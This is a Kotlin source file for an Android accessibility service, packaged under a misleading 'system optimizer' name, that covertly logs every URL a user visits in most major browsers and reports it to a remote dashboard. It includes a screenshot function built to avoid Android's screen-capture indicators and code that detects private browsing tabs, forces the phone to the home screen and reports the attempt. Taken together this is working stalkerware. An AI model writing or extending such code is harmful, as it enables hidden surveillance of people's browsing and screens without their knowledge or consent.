package com.system.optimizer.monitor

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.ByteArrayOutputStream
import java.net.URI
import java.util.UUID

/**
 * Accessibility Service that monitors browser URL bars to track
 * which websites are visited and for how long.
 *
 * Supports: Chrome, Edge, Firefox, Samsung Internet, Opera, Brave, UC Browser.
 *
 * Sends domain + duration data to MonitoringService via a static callback,
 * which then forwards it to the server over WebSocket.
 */
class BrowserTracker : AccessibilityService() {

    private val TAG = "BrowserTracker"
    private val handler = Handler(Looper.getMainLooper())

    // Browser package → URL bar resource ID mappings
    private val browserUrlBarIds = mapOf(
        "com.android.chrome" to "com.android.chrome:id/url_bar",
        "com.chrome.beta" to "com.chrome.beta:id/url_bar",
        "com.chrome.dev" to "com.chrome.dev:id/url_bar",
        "com.chrome.canary" to "com.chrome.canary:id/url_bar",
        "com.microsoft.emmx" to "com.microsoft.emmx:id/url_bar",
        "org.mozilla.firefox" to "org.mozilla.firefox:id/url_bar_title",
        "org.mozilla.firefox_beta" to "org.mozilla.firefox_beta:id/url_bar_title",
        "com.opera.browser" to "com.opera.browser:id/url_field",
        "com.opera.mini.native" to "com.opera.mini.native:id/url_field",
        "com.brave.browser" to "com.brave.browser:id/url_bar",
        "com.sec.android.app.sbrowser" to "com.sec.android.app.sbrowser:id/location_bar_edit_text",
        "com.UCMobile.intl" to "com.UCMobile.intl:id/address_editor_with_security",
        "com.vivaldi.browser" to "com.vivaldi.browser:id/url_bar"
    )

    // All known browser packages (including those without specific URL bar IDs)
    private val allBrowserPackages = browserUrlBarIds.keys + setOf(
        "com.duckduckgo.mobile.android",
        "com.kiwibrowser.browser",
        "org.chromium.chrome"
    )

    // State tracking
    private var currentDomain: String? = null
    private var currentUrl: String? = null
    private var currentBrowserPackage: String? = null
    private var currentVisitId: String? = null
    private var domainStartTime: Long = 0L
    private var lastReportedDomain: String? = null
    private var lastReportedTime: Long = 0L

    // Minimum duration (in ms) before reporting a site visit (avoids noise from quick navigations)
    private val MIN_VISIT_DURATION_MS = 3_000L // 3 seconds
    // Debounce interval to avoid flooding with duplicate events
    private val DEBOUNCE_MS = 1_000L // 1 second

    companion object {
        @Volatile
        var instance: BrowserTracker? = null

        /**
         * Static callback set by MonitoringService to receive web activity events.
         * Parameters: domain, url, durationSeconds, visitId
         */
        @Volatile
        var onWebActivity: ((domain: String, url: String, durationSeconds: Int, visitId: String) -> Unit)? = null

        /**
         * Capture a 100% stealth screenshot using AccessibilityService (Android 11+).
         * Produces ZERO screencast/screen mirroring indicators in the Android menu/status bar!
         */
        fun captureStealthBase64(context: Context, callback: (String?) -> Unit) {
            val service = instance
            if (service == null || Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                callback(null)
                return
            }
            try {
                service.takeScreenshot(
                    Display.DEFAULT_DISPLAY,
                    context.mainExecutor,
                    object : AccessibilityService.TakeScreenshotCallback {
                        override fun onSuccess(screenshot: AccessibilityService.ScreenshotResult) {
                            try {
                                val hwBitmap = Bitmap.wrapHardwareBuffer(
                                    screenshot.hardwareBuffer,
                                    screenshot.colorSpace
                                )
                                var bitmap: Bitmap? = null
                                if (hwBitmap != null) {
                                    try {
                                        bitmap = hwBitmap.copy(Bitmap.Config.ARGB_8888, false)
                                    } catch (_: Exception) {}

                                    if (bitmap == null) {
                                        try {
                                            bitmap = Bitmap.createBitmap(hwBitmap.width, hwBitmap.height, Bitmap.Config.ARGB_8888)
                                            val canvas = android.graphics.Canvas(bitmap)
                                            canvas.drawBitmap(hwBitmap, 0f, 0f, null)
                                        } catch (e: Exception) {
                                            Log.e("BrowserTracker", "Canvas draw failed: ${e.message}")
                                        }
                                    }
                                    hwBitmap.recycle()
                                }
                                screenshot.hardwareBuffer.close()

                                if (bitmap != null) {
                                    val stream = ByteArrayOutputStream()
                                    bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream)
                                    val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
                                    bitmap.recycle()
                                    callback(base64)
                                } else {
                                    callback(null)
                                }
                            } catch (e: Exception) {
                                Log.e("BrowserTracker", "Error compressing stealth screenshot: ${e.message}")
                                callback(null)
                            }
                        }

                        override fun onFailure(errorCode: Int) {
                            Log.w("BrowserTracker", "Stealth takeScreenshot failed with code: $errorCode")
                            callback(null)
                        }
                    }
                )
            } catch (e: Exception) {
                Log.e("BrowserTracker", "Error initiating takeScreenshot: ${e.message}")
                callback(null)
            }
        }
    }

    // Periodically report the active visit so the dashboard updates in real-time
    private val periodicReportTask = object : Runnable {
        override fun run() {
            reportActiveVisit()
            handler.postDelayed(this, 15_000) // every 15 seconds
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "BrowserTracker AccessibilityService connected")

        // Configure the service programmatically as a backup to XML config
        serviceInfo = serviceInfo?.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 300
        }

        // Start periodic reporting of active web visits
        handler.postDelayed(periodicReportTask, 15_000)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: return

        // Only process events from known browser apps
        if (packageName !in allBrowserPackages) {
            // If user switched AWAY from a browser, finalize the current visit
            if (currentDomain != null) {
                finalizeCurrentVisit()
            }
            return
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                // Browser came to foreground or changed window
                currentBrowserPackage = packageName
                extractAndTrackUrl(packageName)
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // URL bar content may have changed
                if (packageName == currentBrowserPackage) {
                    extractAndTrackUrl(packageName)
                }
            }
        }
    }

    /**
     * Attempt to extract the URL from the browser's URL bar using the
     * known resource ID for the given browser package.
     */
    private fun extractAndTrackUrl(packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return

            // 🚫 INCOGNITO BLOCKER: Check if user opened an Incognito or Private Tab
            if (checkAndBlockIncognito(rootNode, packageName)) {
                rootNode.recycle()
                return
            }

            // Try known URL bar resource ID first
            val urlBarId = browserUrlBarIds[packageName]
            var urlText: String? = null

            if (urlBarId != null) {
                val nodes = rootNode.findAccessibilityNodeInfosByViewId(urlBarId)
                if (!nodes.isNullOrEmpty()) {
                    urlText = nodes[0].text?.toString()
                    nodes.forEach { it.recycle() }
                }
            }

            // Fallback: search for any EditText that looks like a URL bar
            if (urlText.isNullOrBlank()) {
                urlText = findUrlByTraversal(rootNode)
            }

            rootNode.recycle()

            if (!urlText.isNullOrBlank()) {
                processUrl(urlText)
            }
        } catch (e: Exception) {
            // Accessibility tree can be flaky — don't crash
            Log.w(TAG, "Error extracting URL: ${e.message}")
        }
    }

    /**
     * Detects Incognito/Private tabs using resource IDs and screen text.
     * If found, immediately forces the phone back to Home Screen and reports the attempt.
     */
    private fun checkAndBlockIncognito(node: AccessibilityNodeInfo, packageName: String): Boolean {
        try {
            // Check known Incognito indicator badges across major browsers
            val incognitoIds = listOf(
                "com.android.chrome:id/incognito_indicator",
                "com.android.chrome:id/incognito_badge",
                "org.mozilla.firefox:id/private_browsing_indicator",
                "com.sec.android.app.sbrowser:id/secret_mode_badge",
                "com.microsoft.emmx:id/inprivate_badge"
            )
            for (id in incognitoIds) {
                val nodes = node.findAccessibilityNodeInfosByViewId(id)
                if (!nodes.isNullOrEmpty()) {
                    nodes.forEach { it.recycle() }
                    blockIncognitoNow(packageName)
                    return true
                }
            }

            // Check if visible text mentions Incognito / Private browsing
            if (hasIncognitoText(node)) {
                blockIncognitoNow(packageName)
                return true
            }
        } catch (_: Exception) {}
        return false
    }

    private fun hasIncognitoText(node: AccessibilityNodeInfo): Boolean {
        try {
            val text = (node.text ?: node.contentDescription)?.toString()?.lowercase()
            if (text != null) {
                if (text.contains("incognito tab") || text.contains("you've gone incognito") ||
                    text.contains("private browsing") || text.contains("private tab") ||
                    text.contains("inprivate tab") || text.contains("secret mode")) {
                    return true
                }
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                val result = hasIncognitoText(child)
                child.recycle()
                if (result) return true
            }
        } catch (_: Exception) {}
        return false
    }

    private fun blockIncognitoNow(packageName: String) {
        val now = System.currentTimeMillis()
        if (now - lastReportedTime < 2000 && lastReportedDomain == "🚫 BLOCKED: Incognito") return

        Log.w(TAG, "Incognito mode detected in $packageName — blocking and resetting browser!")

        // 1. Instantly kick out to Home screen
        performGlobalAction(GLOBAL_ACTION_HOME)

        // 2. Immediately send Chrome/browser an explicit intent to open a normal tab (about:blank)
        // This overrides the active incognito view so when Chrome opens next, it is in normal mode
        try {
            val resetIntent = android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse("about:blank")).apply {
                setPackage(packageName)
                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
            }
            startActivity(resetIntent)
            // 3. Immediately kick back to Home screen so the user stays on Home
            handler.postDelayed({
                performGlobalAction(GLOBAL_ACTION_HOME)
            }, 350)
        } catch (_: Exception) {}

        finalizeCurrentVisit()
        lastReportedDomain = "🚫 BLOCKED: Incognito"
        lastReportedTime = now

        try {
            onWebActivity?.invoke("🚫 BLOCKED: Incognito", "Incognito/Private Tab Attempted ($packageName)", 0, UUID.randomUUID().toString())
        } catch (_: Exception) {}
    }

    /**
     * Fallback: walk the accessibility tree looking for an EditText
     * whose content looks like a URL or domain.
     */
    private fun findUrlByTraversal(node: AccessibilityNodeInfo): String? {
        try {
            val text = node.text?.toString()
            if (text != null && node.className?.toString() == "android.widget.EditText") {
                if (text.contains(".") && !text.contains(" ") && text.length > 3) {
                    return text
                }
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                val result = findUrlByTraversal(child)
                child.recycle()
                if (result != null) return result
            }
        } catch (_: Exception) {}
        return null
    }

    /**
     * Process a raw URL string: normalize it, extract the domain,
     * and track time spent.
     */
    private fun processUrl(rawUrl: String) {
        val domain = extractDomain(rawUrl) ?: return

        // Debounce: ignore rapid-fire duplicate events
        val now = System.currentTimeMillis()
        if (domain == lastReportedDomain && (now - lastReportedTime) < DEBOUNCE_MS) {
            return
        }

        if (rawUrl != currentUrl) {
            // URL changed (e.g. new YouTube video or page navigation) — finalize previous visit and start new one
            finalizeCurrentVisit()
            currentDomain = domain
            currentUrl = rawUrl
            domainStartTime = now
            currentVisitId = UUID.randomUUID().toString()
            Log.d(TAG, "Now tracking URL: $rawUrl [visit: $currentVisitId]")
        }
    }

    /**
     * Finalize the current domain visit: calculate duration and report.
     */
    private fun finalizeCurrentVisit() {
        val domain = currentDomain ?: return
        val url = currentUrl ?: domain
        val durationMs = System.currentTimeMillis() - domainStartTime
        val durationSeconds = (durationMs / 1000).toInt()
        val visitId = currentVisitId ?: UUID.randomUUID().toString()

        if (durationMs >= MIN_VISIT_DURATION_MS) {
            Log.i(TAG, "Visit: $domain — ${durationSeconds}s [visit: $visitId]")
            lastReportedDomain = domain
            lastReportedTime = System.currentTimeMillis()

            try {
                onWebActivity?.invoke(domain, url, durationSeconds, visitId)
            } catch (e: Exception) {
                Log.e(TAG, "Error sending web activity: ${e.message}")
            }
        }

        currentDomain = null
        currentUrl = null
        currentVisitId = null
        domainStartTime = 0L
    }

    /**
     * Extract the domain from a URL string.
     * Handles both full URLs (https://...) and bare domains (google.com).
     */
    private fun extractDomain(rawUrl: String): String? {
        try {
            val url = if (rawUrl.contains("://")) rawUrl else "https://$rawUrl"
            val uri = URI(url)
            var host = uri.host ?: return null
            // Remove "www." prefix
            if (host.startsWith("www.")) host = host.substring(4)
            // Basic validation
            if (!host.contains(".") || host.length < 4) return null
            return host.lowercase()
        } catch (_: Exception) {
            return null
        }
    }

    /**
     * Report the currently active visit without finalizing it.
     * Called every 15s so the dashboard shows live, updating duration.
     */
    private fun reportActiveVisit() {
        val domain = currentDomain ?: return
        val url = currentUrl ?: domain
        val durationMs = System.currentTimeMillis() - domainStartTime
        val durationSeconds = (durationMs / 1000).toInt()
        val visitId = currentVisitId ?: return

        if (durationSeconds >= 3) {
            Log.d(TAG, "Active visit report: $domain — ${durationSeconds}s [visit: $visitId]")
            try {
                onWebActivity?.invoke(domain, url, durationSeconds, visitId)
            } catch (e: Exception) {
                Log.e(TAG, "Error sending active visit: ${e.message}")
            }
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "BrowserTracker interrupted")
        finalizeCurrentVisit()
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(periodicReportTask)
        instance = null
        finalizeCurrentVisit()
    }
}
